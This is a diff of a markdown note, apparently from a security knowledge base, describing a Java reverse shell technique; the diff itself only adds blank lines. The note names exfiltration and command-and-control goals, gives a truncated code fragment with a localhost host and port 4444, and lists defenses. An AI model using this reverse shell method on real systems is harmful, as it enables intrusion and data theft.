@@ -35,11 +35,15 @@ Technical Explanation: The attacker first establishes a listener on a machine th
 
 Business Value: An attacker can use this technique to gain unauthorized access to sensitive data, steal intellectual property, or disrupt business operations.
 
+ 
+
 ## Requirements
 
 1. The victim machine must have Java installed
 
 1. The attacker must have network access to the victim machine
+
+ 
 
 ## Defense
 
@@ -49,6 +53,8 @@ Business Value: An attacker can use this technique to gain unauthorized access t
 
 1. Implement strong authentication mechanisms to prevent unauthorized access to the victim machine
 
+ 
+
 ## Objectives
 
 1. Establish a command and control channel from the victim machine to the attacker-controlled machine
@@ -57,13 +63,21 @@ Business Value: An attacker can use this technique to gain unauthorized access t
 
 1. Exfiltrate data from the victim machine
 
+ 
+
 # Instructions
 
 1. This command allows you to execute commands on a remote machine using Java. To use this command, you need to replace the IP address and port number with the IP address and port number of the remote machine. You also need to replace the cmd variable with the command that you want to execute on the remote machine.
 
+ 
+
+
+
 **Code**: [[String host="127.0.0.1";
 int port=4444;
 String cmd]]
+
+
 
 > The command creates a socket connection to the remote machine and sends the command to be executed. The output of the command is then sent back to the local machine. The command uses the Java ProcessBuilder class to execute the command on the remote machine and the Socket class to create a socket connection to the remote machine. The InputStream and OutputStream classes are used to send and receive data over the socket connection.
 
@@ -87,3 +101,5 @@ String cmd]]
 - [[Java Alternative 1]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
